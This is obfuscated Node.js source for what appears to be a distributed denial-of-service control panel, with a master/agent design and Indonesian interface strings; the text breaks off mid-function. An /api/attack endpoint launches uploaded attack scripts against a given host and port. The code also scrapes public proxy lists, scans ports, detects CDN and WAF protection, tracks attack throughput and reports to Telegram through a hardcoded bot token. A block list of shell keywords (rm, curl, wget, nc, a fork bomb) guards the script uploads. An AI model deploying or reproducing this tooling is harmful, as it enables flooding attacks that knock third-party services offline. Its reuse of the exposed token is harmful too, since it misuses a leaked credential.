const _0x402d66=_0x1a82;(function(_0x2b8cc2,_0x5ace03){const _0x59cd35=_0x1a82,_0x414b1d=_0x2b8cc2();while(!![]){try{const _0x309d2d=parseInt(_0x59cd35(0x1dd))/0x1+parseInt(_0x59cd35(0x1af))/0x2*(-parseInt(_0x59cd35(0x1b5))/0x3)+-parseInt(_0x59cd35(0xbb))/0x4+-parseInt(_0x59cd35(0xe5))/0x5+parseInt(_0x59cd35(0x23f))/0x6*(-parseInt(_0x59cd35(0x1f4))/0x7)+-parseInt(_0x59cd35(0x1aa))/0x8*(-parseInt(_0x59cd35(0x1f2))/0x9)+parseInt(_0x59cd35(0x1cc))/0xa;if(_0x309d2d===_0x5ace03)break;else _0x414b1d['push'](_0x414b1d['shift']());}catch(_0x5d54d7){_0x414b1d['push'](_0x414b1d['shift']());}}}(_0x59fa,0xc694e));const os=require('os'),fs=require('fs'),path=require(_0x402d66(0x10d)),express=require(_0x402d66(0x14e)),http=require(_0x402d66(0x19b)),crypto=require(_0x402d66(0x173)),{execSync,spawn}=require(_0x402d66(0x138)),multer=require(_0x402d66(0xcf)),axios=require(_0x402d66(0x19c)),FormData=require('form-data'),whois=require(_0x402d66(0x165)),net=require(_0x402d66(0x25f)),pidusage=require('pidusage'),localtunnel=require(_0x402d66(0x123)),WebSocket=require('ws'),dns=require('dns')['promises'],fetch=(..._0x5bdb88)=>import(_0x402d66(0x1df))[_0x402d66(0xc5)](({default:_0x1dd49d})=>_0x1dd49d(..._0x5bdb88)),port=process['env']['PORT']||process[_0x402d66(0x25b)][_0x402d66(0x1bc)]||0x82a,TELEGRAM_BOT_TOKEN=process[_0x402d66(0x25b)][_0x402d66(0xdb)]||'7935900603:AAGA9YJcNDKfnpLYbWKwF7nSyNUBVoQb7Cw',TELEGRAM_CHAT_ID=process['env'][_0x402d66(0x11e)]||_0x402d66(0x1be),NODE_TYPE=process['env']['NODE_TYPE']||_0x402d66(0x1b9),AGENT_KEY=process[_0x402d66(0x25b)][_0x402d66(0x204)]||_0x402d66(0xa2),MASTER_URL=process[_0x402d66(0x25b)]['MASTER_URL']||_0x402d66(0x174),AUTO_DELETE_AGENT=process[_0x402d66(0x25b)][_0x402d66(0x1e8)]==='false',apiKey=_0x402d66(0xa2),DEFAULT_PHOTO_URL=_0x402d66(0x262),methodsPath=path[_0x402d66(0x264)](__dirname,'methods.json'),agentsPath=path['join'](__dirname,_0x402d66(0x24e)),historyPath=path[_0x402d66(0x264)](__dirname,_0x402d66(0x1b2)),uploadDir=path[_0x402d66(0x264)](__dirname,'lib',_0x402d66(0x25d)),fingerprintFile=path[_0x402d66(0x264)](__dirname,_0x402d66(0x1f6)),MAX_FILE_SIZE=0x15e*0x400,DANGEROUS_KEYWORDS=['rm\x20','rm\x20-',_0x402d66(0x222),'shutdown','reboot',_0x402d66(0x214),_0x402d66(0x16b),_0x402d66(0x11b),_0x402d66(0x215),'curl\x20',_0x402d66(0x22a),_0x402d66(0xdc),_0x402d66(0x229),_0x402d66(0x22e),_0x402d66(0x110),'chown\x20',_0x402d66(0x1ab),_0x402d66(0x12d),_0x402d66(0x223)];if(!fs[_0x402d66(0x25e)](uploadDir))fs[_0x402d66(0x17b)](uploadDir,{'recursive':!![]});const SCRAPE_SOURCES=[{'url':'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=4000&country=all&ssl=all&anonymity=all','proto':_0x402d66(0x19b)},{'url':_0x402d66(0x1d0),'proto':'socks4'},{'url':'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=4000&country=all&ssl=all&anonymity=all','proto':_0x402d66(0x239)},{'url':_0x402d66(0xba),'proto':'http'},{'url':_0x402d66(0x1d6),'proto':_0x402d66(0x258)},{'url':_0x402d66(0x17f),'proto':'socks5'},{'url':'https://spys.me/proxy.txt','proto':'mix'}];let AGENT_LIST=[],localTunnelUrl=null,currentTunnel=null,LAST_REGISTERED={'name':null,'url':null};const activeProcesses={},stats={},AGENT_FINGERPRINT=generateOrReadFingerprint();function escapeTelegram(_0x3ac256){const _0xabb7ed=_0x402d66;if(!_0x3ac256)return'';return _0x3ac256['replace'](/[_*[\]()`~>#\+\-=|{}.!]/g,_0xabb7ed(0xce));}function generateOrReadFingerprint(){const _0x6680fc=_0x402d66;try{if(fs[_0x6680fc(0x25e)](fingerprintFile)){const _0x4ef992=fs[_0x6680fc(0x152)](fingerprintFile,_0x6680fc(0xef))[_0x6680fc(0x157)]();if(_0x4ef992['length']===0x40)return _0x4ef992;}}catch(_0x40b777){logActivity(_0x6680fc(0x1d2),{'error':_0x40b777[_0x6680fc(0x22d)]});}const _0x224f87=os['hostname']()+':'+os[_0x6680fc(0x1fa)]()+':'+port+':'+Date['now']()+':'+crypto[_0x6680fc(0x1f3)](0x6)[_0x6680fc(0xa4)]('hex'),_0x215c8f=crypto[_0x6680fc(0x18a)]('sha256')[_0x6680fc(0xfa)](_0x224f87)[_0x6680fc(0x1f9)]('hex');try{fs['writeFileSync'](fingerprintFile,_0x215c8f);}catch(_0x4f44d1){logActivity(_0x6680fc(0x1d7),{'error':_0x4f44d1[_0x6680fc(0x22d)]});}return _0x215c8f;}function logActivity(_0x35837a,_0x4f54c8){const _0x133a5c=_0x402d66;try{fs[_0x133a5c(0x1ba)](path[_0x133a5c(0x264)](__dirname,_0x133a5c(0xe4)),'['+new Date()[_0x133a5c(0x259)]()+']\x20'+_0x35837a+':\x20'+JSON[_0x133a5c(0x160)](_0x4f54c8)+'\x0a');}catch(_0x1d8b6f){}}function readFileJsonSafe(_0x3a2666,_0x4b5498=null){const _0x6da60a=_0x402d66;try{if(!fs[_0x6da60a(0x25e)](_0x3a2666))return _0x4b5498;return JSON[_0x6da60a(0x18f)](fs[_0x6da60a(0x152)](_0x3a2666,_0x6da60a(0xef)));}catch(_0x2a22c4){return logActivity('READ_JSON_ERROR',{'filepath':_0x3a2666,'error':_0x2a22c4[_0x6da60a(0x22d)]}),_0x4b5498;}}function writeFileJsonSafe(_0x9d8452,_0x1290c6){const _0x30032f=_0x402d66;try{if(_0x1290c6===undefined||_0x1290c6===null)throw new Error(_0x30032f(0xa9));const _0x2f24eb=JSON[_0x30032f(0x160)](_0x1290c6,null,0x2);fs[_0x30032f(0x154)](_0x9d8452,_0x2f24eb);}catch(_0x76f1a6){logActivity(_0x30032f(0x156),{'filepath':_0x9d8452,'error':_0x76f1a6['message']});}}function readHistory(){return readFileJsonSafe(historyPath,[]);}function _0x1a82(_0x5925f3,_0x3bd515){const _0x59faa0=_0x59fa();return _0x1a82=function(_0x1a82fa,_0x190e5f){_0x1a82fa=_0x1a82fa-0x9e;let _0x53a693=_0x59faa0[_0x1a82fa];return _0x53a693;},_0x1a82(_0x5925f3,_0x3bd515);}function writeHistory(_0x39e9ff){writeFileJsonSafe(historyPath,_0x39e9ff);}function logAttackHistory(_0x42e76d){const _0x5b6ab8=_0x402d66,_0x3879cd=readHistory();_0x3879cd[_0x5b6ab8(0x253)](_0x42e76d),writeHistory(_0x3879cd);}function updateAttackHistory(_0x87011a,_0x2201db){const _0x2be1f4=readHistory(),_0x333dbd=_0x2be1f4['findIndex'](_0x5e0fc5=>_0x5e0fc5['processId']===_0x87011a);_0x333dbd!==-0x1&&(Object['assign'](_0x2be1f4[_0x333dbd],_0x2201db),writeHistory(_0x2be1f4));}function loadAgents(){AGENT_LIST=readFileJsonSafe(agentsPath,[]);}function saveAgents(){writeFileJsonSafe(agentsPath,AGENT_LIST);}function readMethods(){return readFileJsonSafe(methodsPath,{});}function writeMethods(_0x1dabf8){writeFileJsonSafe(methodsPath,_0x1dabf8);}function parseProxyLine(_0x274b9e){const _0x14908a=_0x402d66;_0x274b9e=_0x274b9e[_0x14908a(0x157)]();if(/^\d{1,3}(\.\d{1,3}){3}:\d+/[_0x14908a(0xa0)](_0x274b9e))return _0x274b9e['split'](/\s/)[0x0];return null;}async function scanCommonPorts(_0x3d1326,_0x5a85d1=[0x50,0x1bb,0x15,0x16,0x19,0x35,0x1f90,0x20fb,0xcea]){const _0x4efa9b=_0x402d66,_0x37244a=[];for(const _0x50cec4 of _0x5a85d1){const _0x3af56e=await new Promise(_0x47ed48=>{const _0x101a51=_0x1a82,_0xe6b242=new net[(_0x101a51(0xf1))]();_0xe6b242[_0x101a51(0x158)](0x5dc),_0xe6b242['once'](_0x101a51(0x12a),()=>{_0xe6b242['destroy'](),_0x47ed48(!![]);}),_0xe6b242[_0x101a51(0xdf)]('timeout',()=>{const _0x2e70e8=_0x101a51;_0xe6b242[_0x2e70e8(0x155)](),_0x47ed48(![]);}),_0xe6b242[_0x101a51(0xdf)]('error',()=>_0x47ed48(![])),_0xe6b242[_0x101a51(0x12a)](_0x50cec4,_0x3d1326);});if(_0x3af56e)_0x37244a[_0x4efa9b(0x210)]({'port':_0x50cec4,'status':_0x4efa9b(0x124)});}return _0x37244a;}async function sendTelegramPhoto(_0x1de88a,_0x5c43a=DEFAULT_PHOTO_URL){const _0x306603=_0x402d66;try{await axios[_0x306603(0x1a2)](_0x306603(0x1ea)+TELEGRAM_BOT_TOKEN+_0x306603(0x109),{'chat_id':TELEGRAM_CHAT_ID,'photo':_0x5c43a,'caption':_0x1de88a,'parse_mode':_0x306603(0x245)});}catch(_0x2fd541){logActivity(_0x306603(0x134),_0x2fd541[_0x306603(0x22d)]);}}const storage=multer['diskStorage']({'destination':(_0xb45417,_0x4cbac1,_0x3b6035)=>_0x3b6035(null,uploadDir),'filename':(_0x5e084a,_0x32b009,_0x47c546)=>_0x47c546(null,_0x32b009['originalname'])}),upload=multer({'storage':storage,'limits':{'fileSize':MAX_FILE_SIZE},'fileFilter':(_0x1d93fe,_0x305570,_0x44714c)=>{const _0x203d34=_0x402d66,_0x1e2fd4=path[_0x203d34(0x232)](_0x305570[_0x203d34(0x201)])['toLowerCase'](),_0x321f07=[_0x203d34(0x101),'.sh'];if(!_0x321f07[_0x203d34(0xd1)](_0x1e2fd4))return _0x44714c(new Error('Hanya\x20file\x20.js\x20atau\x20.sh\x20yang\x20diizinkan'));_0x44714c(null,!![]);}}),app=express(),httpServer=http['createServer'](app);app[_0x402d66(0x260)](express[_0x402d66(0xb6)]()),app[_0x402d66(0x260)]((_0x2911a0,_0x297a83,_0x48f5c1)=>{const _0xa1a400=_0x402d66;_0x297a83[_0xa1a400(0x220)]('Access-Control-Allow-Origin','*'),_0x297a83[_0xa1a400(0x220)](_0xa1a400(0xab),_0xa1a400(0x192)),_0x297a83[_0xa1a400(0x220)]('Access-Control-Allow-Headers','Content-Type,\x20Authorization'),_0x48f5c1();}),app['use'](_0x402d66(0x198),express[_0x402d66(0xd3)](uploadDir));const wss=new WebSocket[(_0x402d66(0x194))]({'server':httpServer});function broadcastWS(_0x16a61d){const _0x9fa078=_0x402d66,_0x5bd825=typeof _0x16a61d===_0x9fa078(0x1e7)?_0x16a61d:JSON[_0x9fa078(0x160)](_0x16a61d);if(!wss||!wss[_0x9fa078(0xeb)]||wss[_0x9fa078(0xeb)][_0x9fa078(0xbe)]===0x0)return;wss['clients'][_0x9fa078(0x1a5)](_0x12d107=>{const _0x24931f=_0x9fa078;if(_0x12d107['readyState']!==WebSocket['OPEN']){_0x12d107['terminate']();return;}try{_0x12d107['send'](_0x5bd825);}catch(_0x35dbf5){logActivity('WS_SEND_FAIL',{'error':_0x35dbf5[_0x24931f(0x22d)]}),console['error'](_0x24931f(0x224),_0x35dbf5['message']),_0x12d107[_0x24931f(0x20b)]();}});}function spawnAttackScript(_0x60207e,_0x2a77da,_0x54d058){const _0x470048=_0x402d66,_0x13b911=_0x60207e[_0x470048(0xd1)]('/')||_0x60207e[_0x470048(0xd1)]('\x5c'),_0x2378cf=_0x13b911?path['join'](__dirname,_0x60207e):path[_0x470048(0x264)](uploadDir,_0x60207e);if(!fs[_0x470048(0x25e)](_0x2378cf)){const _0x3b2ae4=_0x470048(0x20e)+_0x2378cf+_0x470048(0x1ce);logActivity('SPAWN_SCRIPT_MISSING',{'processId':_0x54d058,'scriptPath':_0x2378cf});throw new Error(_0x3b2ae4);}const _0x3c842c=spawn(_0x470048(0x1e3),[_0x2378cf,..._0x2a77da]);return activeProcesses[_0x54d058]={'ls':_0x3c842c,'scriptName':_0x60207e,'args':_0x2a77da,'status':'running','lastResponse':Date[_0x470048(0x117)](),'restartCount':0x0},stats[_0x54d058]={'rps':0x0,'pps':0x0,'bps':0x0,'_tempRps':0x0,'_tempPps':0x0,'_tempBps':0x0},stats[_0x54d058][_0x470048(0x1a9)]=setInterval(()=>{const _0x2a7b79=_0x470048;stats[_0x54d058][_0x2a7b79(0xe7)]=stats[_0x54d058][_0x2a7b79(0xbc)],stats[_0x54d058]['pps']=stats[_0x54d058][_0x2a7b79(0x203)],stats[_0x54d058][_0x2a7b79(0x208)]=stats[_0x54d058]['_tempBps'],stats[_0x54d058][_0x2a7b79(0xbc)]=0x0,stats[_0x54d058][_0x2a7b79(0x203)]=0x0,stats[_0x54d058]['_tempBps']=0x0;},0x3e8),_0x3c842c[_0x470048(0x13b)]['on'](_0x470048(0x1e4),_0x3810c6=>{const _0x1e9f0c=_0x470048,_0x1d9c9a=_0x3810c6[_0x1e9f0c(0xa4)]();activeProcesses[_0x54d058]&&(activeProcesses[_0x54d058][_0x1e9f0c(0x189)]=Date[_0x1e9f0c(0x117)](),activeProcesses[_0x54d058]['status']=_0x1e9f0c(0x25c));if(!stats[_0x54d058])return;const _0x15d7cd=_0x1d9c9a[_0x1e9f0c(0x13d)](/RPS[:=]?\s*(\d+)/i),_0x3349f5=_0x1d9c9a[_0x1e9f0c(0x13d)](/PPS[:=]?\s*(\d+)/i),_0x7af98a=_0x1d9c9a[_0x1e9f0c(0x13d)](/BPS[:=]?\s*(\d+)/i);if(_0x15d7cd)stats[_0x54d058][_0x1e9f0c(0xbc)]+=parseInt(_0x15d7cd[0x1]);if(_0x3349f5)stats[_0x54d058][_0x1e9f0c(0x203)]+=parseInt(_0x3349f5[0x1]);if(_0x7af98a)stats[_0x54d058][_0x1e9f0c(0x199)]+=parseInt(_0x7af98a[0x1]);stats[_0x54d058][_0x1e9f0c(0xbc)]+=0x1;}),_0x3c842c[_0x470048(0x22f)]['on'](_0x470048(0x1e4),_0x89df09=>{const _0x30abf3=_0x470048;activeProcesses[_0x54d058]&&(activeProcesses[_0x54d058][_0x30abf3(0x12f)]=_0x30abf3(0xe3)),logActivity('PROCESS_STDERR',{'processId':_0x54d058,'error':_0x89df09[_0x30abf3(0xa4)]()}),sendTelegramPhoto(_0x30abf3(0x129)+('*PID:*\x20`'+_0x3c842c[_0x30abf3(0x1c8)]+'`\x0a')+(_0x30abf3(0xf4)+escapeTelegram(_0x54d058)+'`\x0a')+(_0x30abf3(0x1f5)+escapeTelegram(_0x89df09[_0x30abf3(0xa4)]())+_0x30abf3(0x1f1)));}),_0x3c842c['on']('error',_0x222d9c=>{const _0xc85b2f=_0x470048;activeProcesses[_0x54d058]&&(activeProcesses[_0x54d058][_0xc85b2f(0x12f)]=_0xc85b2f(0x24a)),logActivity(_0xc85b2f(0x24c),{'processId':_0x54d058,'error':_0x222d9c[_0xc85b2f(0xa4)]()}),sendTelegramPhoto(_0xc85b2f(0x261)+(_0xc85b2f(0xb2)+(_0x3c842c?.['pid']||_0xc85b2f(0x1db))+'`\x0a')+(_0xc85b2f(0xf4)+escapeTelegram(_0x54d058)+'`\x0a')+(_0xc85b2f(0x1f5)+escapeTelegram(_0x222d9c['toString']())+_0xc85b2f(0x1f1)));}),_0x3c842c['on'](_0x470048(0xaa),_0x24687e=>{const _0x298d0a=_0x470048;activeProcesses[_0x54d058]&&(activeProcesses[_0x54d058][_0x298d0a(0x12f)]=_0x298d0a(0x254),activeProcesses[_0x54d058][_0x298d0a(0x244)]=_0x24687e),clearInterval(stats[_0x54d058]?.['_interval']),delete stats[_0x54d058],delete activeProcesses[_0x54d058],updateAttackHistory(_0x54d058,{'endTime':new Date()['toISOString'](),'status':_0x298d0a(0x1b0),'exitCode':_0x24687e}),logActivity(_0x298d0a(0xb8),{'processId':_0x54d058,'exitCode':_0x24687e}),broadcastWS({'type':'attack_stopped','processId':_0x54d058,'exitCode':_0x24687e}),sendTelegramPhoto(_0x298d0a(0xb5)+(_0x298d0a(0xb2)+_0x3c842c['pid']+'`\x0a')+(_0x298d0a(0xf4)+escapeTelegram(_0x54d058)+'`\x0a')+(_0x298d0a(0xfc)+_0x24687e+'`'));}),{'processId':_0x54d058,'ls':_0x3c842c,'scriptName':_0x60207e,'args':_0x2a77da};}function _0x59fa(){const _0x11b965=['dd\x20','Content-Type','Gagal\x20menyimpan\x20file','TG_CHAT','whois','lastOnline','Gagal\x20memeriksa\x20host','Agent\x20diperbarui','localtunnel','open','AbortError','AGENT_HEALTH_LOOP_ERROR:','/api/attack','longitude','‚ùóÔ∏è\x20*Proses\x20error*\x0a','connect','filter','pps','userdel','getHeaders','status','wafDetection','Method\x20tidak\x20ditemukan','srv1','STOP_PROCESS','SEND_TELEGRAM_PHOTO_ERR','/api/method-files/view/:filename','Country','AGENT_UPDATED','child_process','SERVER_START','Tidak\x20ada\x20file\x20proxy\x20ter-upload','stdout','FETCH_ERROR','match','RENAME_METHOD_FILE','country','Semua\x20proses\x20di\x20master\x20&\x20agents\x20dihentikan','Format\x20JSON\x20tidak\x20valid.','/api/fingerprint-full','agent_deleted','lib/method/','BLOCK_UPLOAD_FILENAME','org','round','Method\x20diperbarui','get','has','openPorts','catch','UPDATE_METHOD','express','Gagal\x20membuat\x20tunnel\x20baru\x20(null\x20atau\x20tanpa\x20URL)','/api/methods/:oldName','signal','readFileSync','.sh','writeFileSync','destroy','WRITE_JSON_ERROR','trim','setTimeout','[AGENT]\x20Tunnel\x20error\x20503\x20detected!\x20Restarting\x20tunnel...','stack','/api/agents/register','type','API\x20key\x20tidak\x20valid','dashboard.html','createReadStream','stringify','loadavg','latitude','/api/hostcheck','/api/health','whois-json','connection','attack_stopped','Parameter\x20filename\x20diperlukan','mtime','isp','mkfs','\x1b[31m%s\x1b[0m','memoryMB','SYNC_DELETE_METHOD_FILE','srv','query','AUTO_SYNC_METHOD_FILE_FAIL','AGENT_MARKED_OFFLINE','crypto','http://158.69.174.202:20193','proto','Agent\x20dihapus','readdir','Akamai','stopped_by_user','headers','mkdirSync','memory','[INFO]\x20Deteksi\x20URL\x20tunnel\x20berubah.\x20Register\x20ulang\x20ke\x20master...','SAVE_METHOD','https://www.proxy-list.download/api/v1/get?type=socks5','AUTO_SYNC_METHOD_FILE','restartCount','MASTER_STOP','curl\x20-s\x20ifconfig.me','keys','http://','openPortsError','MASTER_ATTACK','/api/method-files/:filename','lastResponse','createHash','[AGENT]\x20Tunnel\x20restarted\x20and\x20registered\x20to\x20master.','SCRAPE_SOURCE_FAILED','kill','Gagal\x20membaca\x20isi\x20file','parse','isArray','/api/attack/stop/:processId','GET,\x20POST,\x20PUT,\x20DELETE,\x20OPTIONS','SAVE_AGENTS_ERROR','Server','uptime','Nama\x20dan\x20URL\x20wajib\x20diisi','RECEIVE_UPDATE_MOVE','/lib/method','_tempBps','AUTO_SYNC_PROXY_TXT_FAIL','http','axios','Tipe\x20file\x20tidak\x20diizinkan.','*/*','proxy.txt\x20berhasil\x20di-update','[AGENT]\x20Tunnel\x20closed.\x20Attempting\x20to\x20restart...','ALL','post','AGENT_ADDED','city','forEach','unlinkSync','x-akamai-transformed','redirect','_interval','1123424AJfjHU','useradd','/api/agent/update','findIndex','<time>','52GNgXxx','stopped','toFixed','attack_history.json','online','https://ipwho.is/','8331tGNiSN','x-cdn','scriptName','startsWith','agent','appendFileSync','cf-ray','SERVER_PORT','file','6818878581','address','urlInfo','exit','createWriteStream','send','PUSH_UPDATE','Method\x20dihapus','File\x20tidak\x20ditemukan','File\x20proxy\x20tidak\x20valid\x20atau\x20terlalu\x20sedikit\x20baris\x20yang\x20sesuai\x20format\x20IP:PORT.','pid','TIMEOUT','all_stopped','üõë\x20*STOP\x20broadcast\x20ke\x20agents\x20&\x20master:*\x0a','21400270zCUtmq','length','\x22\x20tidak\x20ditemukan','attack_started','https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=4000&country=all&ssl=all&anonymity=all','finish','FINGERPRINT_READ_ERROR','body','File\x20update\x20diterima','proxy.txt','https://www.proxy-list.download/api/v1/get?type=socks4','FINGERPRINT_WRITE_ERROR','listen','clear','AUTO_SYNC_METHODS_JSON','unknown','all','80708MBTKtb','<host>','node-fetch','Agent\x20terdaftar','success','[Unknown\x20Error\x20Handler]','node','data','Sucuri','/lib/method/','string','AUTO_DELETE_AGENT','/api/methods/delete-file','https://api.telegram.org/bot','delete','üéØ\x20*Port:*\x20`','readdirSync','File\x20berhasil\x20disimpan','üõë\x20*Semua\x20proses\x20serangan\x20dihentikan\x20oleh\x20pengguna*','key','\x0a```','90HyDSRU','randomBytes','2226PGLLuH','*Error:*\x0a```\x0a','agent_fingerprint.txt','File\x20dengan\x20nama\x20baru\x20sudah\x20ada','script','digest','platform','fingerprint','Cloudflare','Parameter\x20\x27target\x27\x20diperlukan','\x0a\x20\x20\x20\x20<h2>Upload\x20File\x20Method</h2>\x0a\x20\x20\x20\x20<form\x20action=\x22/api/uploadmeth\x22\x20method=\x22post\x22\x20enctype=\x22multipart/form-data\x22>\x0a\x20\x20\x20\x20\x20\x20<label>API\x20Key:\x20<input\x20type=\x22text\x22\x20name=\x22key\x22\x20required\x20/></label><br/><br/>\x0a\x20\x20\x20\x20\x20\x20<label>Pilih\x20File:\x20<input\x20type=\x22file\x22\x20name=\x22file\x22\x20required\x20/></label><br/><br/>\x0a\x20\x20\x20\x20\x20\x20<button\x20type=\x22submit\x22>Upload</button>\x0a\x20\x20\x20\x20</form>\x0a\x20\x20','Menutup\x20aplikasi...','Scrape\x20proxy\x20selesai','originalname','renameSync','_tempPps','AGENT_KEY','region','append','protocols','bps','Gagal\x20stop\x20proses','failed','terminate','AUTO_MIRROR_REMOVE_FILE','entries','Script\x20file\x20\x22','/api/attack/stop','push','sendFile','oldName','File\x20dihapus',':(){:|:&};:','wget\x20','agent_status_update','Nama\x20file\x20berhasil\x20diubah','/api/attack-history','ERROR_ATTACK','stream','[AGENT]\x20Tunnel\x20error\x20503\x20detected\x20(err.response)!\x20Restarting\x20tunnel...','lookup','values','File\x20dihapus\x20di\x20agent','endsWith','setHeader','hostname','sudo\x20','passwd','[WS\x20ERROR]\x20Gagal\x20kirim\x20ke\x20client:','Tidak\x20ada\x20file\x20ter-upload','enabled','Offline\x20>\x203\x20menit','Parameter\x20salah\x20atau\x20API\x20key\x20tidak\x20valid','python\x20-m\x20http.server','nc\x20','AGENT_DELETE_METHOD_FILE','cloudflare','message','forkbomb','stderr','üõ°Ô∏è\x20*Host:*\x20`','SIGINT','extname','üìÅ\x20*File\x20method\x20baru\x20di-upload*\x0a','AGENT_DELETED_OFFLINE','Parameter\x20oldName\x20dan\x20newName\x20diperlukan','Sudah\x20terdaftar','toLowerCase','AUTO_MIRROR_REMOVE_FAIL','socks5','UPLOAD_METHOD_FILE','code','split','memoryUsage','/api/method-files/rename','15066fjZQGD','x-powered-by','TUNNEL_RESTART_FAIL','ERROR_STOP','Durasi\x20waktu\x20harus\x20berupa\x20angka\x20positif','exitCode','MarkdownV2','üî•\x20*Serangan\x20dimulai\x20(','DELETE_METHOD_FILE','find','dnsInfo','crashed','SERVER\x20ONLINE:\x20http://','PROCESS_CRASHED','Gagal\x20ambil\x20header:\x20','agents.json','url','text/plain','name','AGENT_REGISTER_AUTO','unshift','exited','Update\x20didistribusikan','/api/methods/:name','Semua\x20proses\x20dihentikan.','socks4','toISOString','[Custom\x20Error\x20Handler]','env','running','method','existsSync','net','use','üí•\x20*Proses\x20crash*\x0a','https://ibb.co/bgKKLJDS','/api/method-files/download/:filename','join','host','response','test','/api/uploadmeth','narxz','filename','toString','AUTO_REGISTER_MASTER_FAIL','download','Serangan\x20dimulai\x20(','byProto','Data\x20kosong\x20atau\x20tidak\x20valid','close','Access-Control-Allow-Methods','Method\x20lama\x20tidak\x20ditemukan','LocalTunnel\x20tidak\x20mengembalikan\x20URL','put','master','Gagal\x20membaca\x20direktori','/api/attack/history','*PID:*\x20`','START_ATTACK','Log\x20cleared','üõë\x20*Proses\x20selesai/stop*\x0a','json','Agent\x20URL\x20via\x20LocalTunnel:','PROCESS_EXITED','*File:*\x20`','https://www.proxy-list.download/api/v1/get?type=http','3432664fBATQC','_tempRps','Process\x20ID\x20tidak\x20ditemukan','size','totalmem','api.js','Gagal\x20fingerprint','RECEIVE_UPDATE_OTHER','asn','AUTO_SYNC_METHODS_JSON_FAIL','then','index.js','üî¢\x20*PID:*\x20`','AUTO_SYNC_PROXY_TXT','HEAD','/api/methods','AUTO_REGISTER_FETCH_FAIL','idle','Port\x20harus\x20berupa\x20angka\x201-65535','\x5c$&','multer','üÜî\x20*Process\x20ID:*\x20`','includes','/api/update-proxy','static','server.js','statSync','File\x20sudah\x20tidak\x20ada','EDIT_METHOD_FILE','log','Hanya\x20master!','GET_PUBLIC_IP_FAIL','TG_TOKEN','netcat','Ukuran\x20file\x20terlalu\x20besar.\x20Maks\x20200KB.','TUNNEL_RESTART_SUCCESS','once','floor','/api/agents','offline','error','activity.log','5413795ubWDBV','map','rps','Nama\x20file\x20tidak\x20diizinkan.','total','‚è±Ô∏è\x20*Durasi:*\x20`','clients','TUNNEL_503_DETECTED','splice','/api/method-files/save/:filename','utf8','https://api.ipify.org?format=json','Socket','some','cpus','*Process\x20ID:*\x20`','target','AGENT_RE_ENABLED','Upload\x20diblokir:\x20terdeteksi\x20keyword\x20berbahaya\x20(\x22','times','Agent\x20tidak\x20ditemukan','update','server','*Exit\x20code:*\x20`','[AGENT]\x20Gagal\x20membuat\x20tunnel\x20baru:','abort','mix','AGENT_HEALTH_LOOP_ERROR','.js','args','Invalid\x20API\x20key','Method\x20disimpan','AGENT_DELETED','‚Ä¢\x20`','agent_update','/api/agents/:name','/sendPhoto','Kesalahan\x20Internal\x20Server','SYNC_EDIT_METHOD_FILE','/api/attack/stats','path','pipe','rss','chmod\x20777\x20/','/dashboard','``\x0a','single','*Ukuran:*\x20`','x-sucuri-id','\x20bytes`','now','cpuPercent','params','/api/method-files'];_0x59fa=function(){return _0x11b965;};return _0x59fa();}app[_0x402d66(0x149)]('/',(_0x505ae0,_0xf73d7d)=>_0xf73d7d[_0x402d66(0x1a8)](_0x402d66(0x111))),app[_0x402d66(0x149)](_0x402d66(0x111),(_0x4cdcd4,_0x4ee142)=>{const _0x44e5c6=_0x402d66;_0x4ee142[_0x44e5c6(0x211)](path[_0x44e5c6(0x264)](__dirname,_0x44e5c6(0x15e)));}),app[_0x402d66(0x149)]('/upload',(_0xfb6d43,_0x476901)=>{const _0x1a1341=_0x402d66;_0x476901['send'](_0x1a1341(0x1fe));}),app['get'](_0x402d66(0x127),async(_0x2797bb,_0x75f00a)=>{const _0x3365a6=_0x402d66;try{const {key:_0x391b98,host:_0x4e416c,port:_0x1d4e75,time:_0x26a910,method:_0x58e153,user:_0x2b78f4}=_0x2797bb[_0x3365a6(0x170)];if(_0x391b98!==apiKey)return _0x75f00a[_0x3365a6(0x12f)](0x190)['send']('API\x20key\x20tidak\x20valid');if(!_0x4e416c||!_0x1d4e75||!_0x26a910||!_0x58e153)return _0x75f00a[_0x3365a6(0x12f)](0x190)[_0x3365a6(0x1c3)]('Parameter\x20tidak\x20lengkap');const _0x491641=parseInt(_0x1d4e75,0xa),_0x4cf9d7=parseInt(_0x26a910,0xa);if(isNaN(_0x491641)||_0x491641<0x1||_0x491641>0xffff)return _0x75f00a['status'](0x190)['send'](_0x3365a6(0xcd));if(isNaN(_0x4cf9d7)||_0x4cf9d7<=0x0)return _0x75f00a[_0x3365a6(0x12f)](0x190)[_0x3365a6(0x1c3)](_0x3365a6(0x243));const _0x1179ed=readMethods(),_0x2d34ae=_0x1179ed[_0x58e153];if(!_0x2d34ae)return _0x75f00a[_0x3365a6(0x12f)](0x190)[_0x3365a6(0x1c3)]('Metode\x20tidak\x20valid');const _0xd6a3b8=_0x2d34ae[_0x3365a6(0x102)][_0x3365a6(0xe6)](_0x292df4=>{const _0x4ad1a8=_0x3365a6;if(typeof _0x292df4===_0x4ad1a8(0x1e7)&&_0x292df4[_0x4ad1a8(0x1b8)]('<')&&_0x292df4[_0x4ad1a8(0x21f)]('>'))switch(_0x292df4){case _0x4ad1a8(0x1de):return _0x4e416c;case'<port>':return _0x1d4e75;case _0x4ad1a8(0x1ae):return _0x26a910;default:return _0x292df4;}return _0x292df4;}),_0x26a96d=_0x58e153+'-'+Date['now'](),_0xe7cc5=spawnAttackScript(_0x2d34ae[_0x3365a6(0x1f8)],_0xd6a3b8,_0x26a96d);logActivity(_0x3365a6(0xb3),{'processId':_0x26a96d,'host':_0x4e416c,'targetPort':_0x1d4e75,'time':_0x26a910,'method':_0x58e153,'pid':_0xe7cc5['ls'][_0x3365a6(0x1c8)],'args':_0xd6a3b8}),logAttackHistory({'processId':_0x26a96d,'startTime':new Date()[_0x3365a6(0x259)](),'endTime':null,'host':_0x4e416c,'port':_0x1d4e75,'method':_0x58e153,'duration':_0x26a910,'status':'running','who':_0x2b78f4||_0x3365a6(0x1db),'masterOrAgent':NODE_TYPE}),broadcastWS({'type':_0x3365a6(0x1cf),'processId':_0x26a96d,'host':_0x4e416c,'port':_0x1d4e75,'method':_0x58e153,'time':_0x26a910}),await 